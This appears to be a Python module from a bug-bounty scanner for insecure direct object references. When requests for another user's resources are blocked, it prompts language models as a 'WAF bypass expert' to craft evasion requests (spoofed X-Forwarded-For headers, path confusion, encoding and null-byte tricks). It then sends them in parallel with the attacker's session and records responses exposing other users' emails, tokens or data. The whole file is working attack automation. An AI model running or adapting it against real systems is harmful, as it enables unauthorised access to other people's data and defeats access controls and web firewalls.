"""
ai_bypass.py — AI-powered bypass for BLOCKED IDOR findings.

Trigger: only when target returned 401/403/405/429/500/502/503.
Parallel: 10 workers, timeout 4s.
"""
import json
import hashlib
import urllib.request
from pathlib import Path
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

from idor_utils import C, G, Y, R, BOLD, RST, DIM, curl_request

BYPASS_MODELS = ["mistral-code", "codestral", "qwen3.8-27b", "nemotron-3-super-120b"]

BYPASS_CATEGORIES = [
    "url_encoding", "case_manipulation", "path_confusion",
    "header_injection", "param_pollution", "content_type",
    "http_method", "unicode_tricks", "null_byte",
    "chunked_encoding", "http2_tricks", "wrapper",
]

# Statuses that mean "blocked" → trigger bypass
BLOCK_STATUSES = (401, 403, 405, 429, 500, 502, 503)

_CACHE = {}


def _sig(f):
    return hashlib.md5(f"{f.get('type','')}|{f.get('url','')}".encode()).hexdigest()[:12]


def _call_ai(model, prompt, api_key, timeout=60):
    url = "http://localhost:3001/v1/chat/completions"
    payload = {
        "model": model,
        "messages": [{"role": "user", "content": prompt}],
        "temperature": 0.3,
        "max_tokens": 2500,
    }
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("Authorization", f"Bearer {api_key}")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as res:
            r = json.loads(res.read().decode("utf-8"))
            t = (r["choices"][0]["message"]["content"] or "").strip()
            if t.startswith("```"):
                t = t.split("```", 2)[1]
                if t.startswith("json"):
                    t = t[4:]
                t = t.strip()
            return t, None
    except Exception as e:
        return None, str(e)


def _build_prompt(finding, waf, tech):
    return f"""You are a WAF bypass expert in bug bounty.

FINDING (was BLOCKED):
- Type: {finding.get('type', 'idor')}
- URL: {finding.get('url', '')}
- Method: {finding.get('method', 'GET')}
- Resource ID: {finding.get('url_id', '?')}
- Session user ID: {finding.get('session_user_id', '?')}
- Reason: {(finding.get('reason') or '')[:200]}
- Status: {json.dumps(finding.get('status', {}))}

TARGET DEFENSES:
- WAF: {waf or 'unknown'}
- Tech: {', '.join(tech) if tech else 'unknown'}

Generate 12-15 bypass attempts across these 12 categories:
{chr(10).join(f"  - {c}" for c in BYPASS_CATEGORIES)}

OUTPUT (STRICT JSON, no markdown):
{{
  "analysis": "1-2 sentences on why it was blocked",
  "bypasses": [
    {{
      "category": "header_injection",
      "url": "https://full-modified-url",
      "method": "GET",
      "headers": {{"X-Forwarded-For": "127.0.0.1"}},
      "body": "",
      "reasoning": "why this might work"
    }}
  ]
}}

RULES:
- Full URL only, do not truncate.
- Prioritize: header_injection > path_confusion > url_encoding.
- Output ONLY the JSON object.
JSON:"""


def _valid(bp, host):
    try:
        if not bp.get("url"):
            return False
        p = urlparse(bp["url"])
        if not p.hostname:
            return False
        if host and p.hostname != host:
            return False
        m = bp.get("method", "GET").upper()
        if m not in ("GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"):
            return False
        if bp.get("headers") and not isinstance(bp["headers"], dict):
            return False
        return True
    except Exception:
        return False


def should_bypass(finding):
    """
    (bool, reason).
    Trigger ONLY when ATTACKER was blocked on victim resource.
    NOT when anon=401 (that's normal auth requirement).
    """
    ftype = (finding.get("type") or "").lower()
    reason = (finding.get("reason") or "").lower()

    # ── RULE 1: confirmed = already worked = never bypass ──
    if ftype == "confirmed":
        return False, "already confirmed IDOR"

    # ── RULE 2: look for BLOCK on the ATTACKER side ──
    st = finding.get("status")
    if isinstance(st, dict):
        for key, val in st.items():
            k = key.lower()
            # Attacker's own request blocked
            if k in ("a", "attacker") and isinstance(val, int) and val in (403, 405, 429, 500, 502, 503):
                return True, f"A blocked ({val})"
            # Victim request blocked (means A tried victim's ID and got blocked)
            if k in ("b", "victim") and isinstance(val, int) and val in (403, 405, 429):
                return True, f"victim-side block ({val})"
        # No blocker found → skip
        return False, "no block on attacker/victim"

    # ── RULE 3: single status = the attack itself ──
    if isinstance(st, int) and st in (403, 405, 429, 500, 502, 503):
        return True, f"attack returned {st}"

    # ── RULE 4: reason mentions explicit block ──
    for kw in ("403", "forbidden", "405", "method not allowed",
               "429", "rate limit", "500 ", "502 ", "waf block"):
        if kw in reason:
            return True, f"reason mentions '{kw.strip()}'"

    return False, "not blocked on attack"


def generate_bypasses(finding, waf, tech, api_key, verbose=True):
    sig = _sig(finding)
    if sig in _CACHE:
        return _CACHE[sig]
    if not api_key:
        return []
    prompt = _build_prompt(finding, waf, tech)
    try:
        host = urlparse(finding.get("url", "")).hostname
    except Exception:
        host = None
    for model in BYPASS_MODELS:
        if verbose:
            print(f"  {DIM}[AI] {model}...{RST}")
        text, err = _call_ai(model, prompt, api_key)
        if err or not text:
            continue
        try:
            s, e = text.find("{"), text.rfind("}")
            data = json.loads(text[s:e+1])
        except Exception:
            continue
        raw = data.get("bypasses", [])
        valid = [b for b in raw[:15] if _valid(b, host)]
        if valid:
            if verbose:
                print(f"  {G}[AI] {len(valid)}/{len(raw)} valid{RST}")
            _CACHE[sig] = valid
            return valid
    return []


def _test_one(bp, cookies, headers, url_id, user_id):
    try:
        r = curl_request(
            bp["url"], method=bp.get("method", "GET").upper(),
            cookies=cookies or {},
            headers={**(headers or {}), **(bp.get("headers") or {})},
            data=bp.get("body") or None, timeout=4,
        )
    except Exception:
        return None
    st = r.get("status", 0)
    body = r.get("body", "") or ""
    if st in (200, 201, 202, 204) and len(body) > 30:
        has_other = url_id and url_id != user_id and url_id in body
        if has_other or any(k in body.lower() for k in ("email", "token", "user")):
            return {
                "bypass": bp, "status": st,
                "evidence": "other user data" if has_other else "sensitive fields",
                "preview": body[:300],
            }
    return None


def test_bypasses(finding, bypasses, cookies, headers, verbose=True):
    successes = []
    url_id = str(finding.get("url_id", ""))
    user_id = str(finding.get("session_user_id", ""))
    with ThreadPoolExecutor(max_workers=10) as ex:
        futs = [ex.submit(_test_one, bp, cookies, headers, url_id, user_id)
                for bp in bypasses]
        for fut in as_completed(futs):
            res = fut.result()
            if res:
                successes.append(res)
                if verbose:
                    print(f"  {G}✅ {res['bypass']['category']} → {res['status']}{RST}")
    return successes


def run_for_findings(findings, waf, tech, api_key, cookies, headers, verbose=True):
    print(f"\n{BOLD}{C}{'═' * 60}{RST}")
    print(f"{BOLD}{C}  AI Bypass — {len(findings)} findings{RST}")
    print(f"{BOLD}{C}{'═' * 60}{RST}")

    to_test, skipped = [], []
    for f in findings:
        need, why = should_bypass(f)
        (to_test if need else skipped).append((f, why))

    if verbose:
        print(f"  {G}Triggered: {len(to_test)}{RST}  |  {DIM}Skipped: {len(skipped)}{RST}\n")
        for f, why in to_test:
            st = f.get("status")
            st_str = json.dumps(st) if isinstance(st, dict) else str(st)
            print(f"  {Y}→{RST} {f.get('type','?'):20} [{st_str}] {f.get('url','')[:55]}")
            print(f"      {DIM}{why}{RST}")

    out = {"total": len(findings), "selected": len(to_test),
           "skipped": len(skipped), "generated": 0,
           "successes": [], "all": []}

    if not to_test:
        if verbose:
            print(f"\n  {DIM}No findings need bypass{RST}")
        return out

    for i, (f, why) in enumerate(to_test, 1):
        if not f.get("url"):
            continue
        if verbose:
            print(f"\n{BOLD}[{i}/{len(to_test)}] {f.get('type','?')} — {f['url'][:70]}{RST}")
        bps = generate_bypasses(f, waf, tech, api_key, verbose)
        if not bps:
            continue
        out["generated"] += 1
        out["all"].append({"finding": f, "trigger": why, "bypasses": bps})
        succ = test_bypasses(f, bps, cookies, headers, verbose)
        for s in succ:
            s["original"] = f
            s["trigger"] = why
        out["successes"].extend(succ)

    if verbose:
        print(f"\n{BOLD}{G}  Summary:{RST}")
        print(f"    Total:      {out['total']}")
        print(f"    Triggered:  {out['selected']}")
        print(f"    Skipped:    {out['skipped']}")
        print(f"    Generated:  {out['generated']}")
        print(f"    Successes:  {len(out['successes'])}")
    return out


def save_results(domain, workspace, results, verbose=True):
    idir = Path(workspace) / domain / "idor"
    idir.mkdir(parents=True, exist_ok=True)
    (idir / "ai_bypasses.json").write_text(
        json.dumps(results, indent=2, ensure_ascii=False, default=str), encoding="utf-8"
    )
    md = [f"# AI Bypass Results — {domain}", "",
          f"- Total findings: {results['total']}",
          f"- Triggered: {results['selected']}",
          f"- Skipped: {results['skipped']}",
          f"- Bypasses generated: {results['generated']}",
          f"- Successful: {len(results['successes'])}", "", "---", ""]
    if results["successes"]:
        md.append("## ✅ Successful Bypasses")
        for i, s in enumerate(results["successes"], 1):
            b = s["bypass"]
            md += [f"### {i}. {b['category']} → {s['status']}",
                   f"- URL: `{b['url']}`",
                   f"- Reasoning: {b.get('reasoning', '?')}",
                   f"- Evidence: {s['evidence']}", ""]
    (idir / "AI_BYPASSES.md").write_text("\n".join(md), encoding="utf-8")
    if verbose:
        print(f"  {G}✔{RST} ai_bypasses.json + AI_BYPASSES.md saved")


def reset():
    _CACHE.clear()
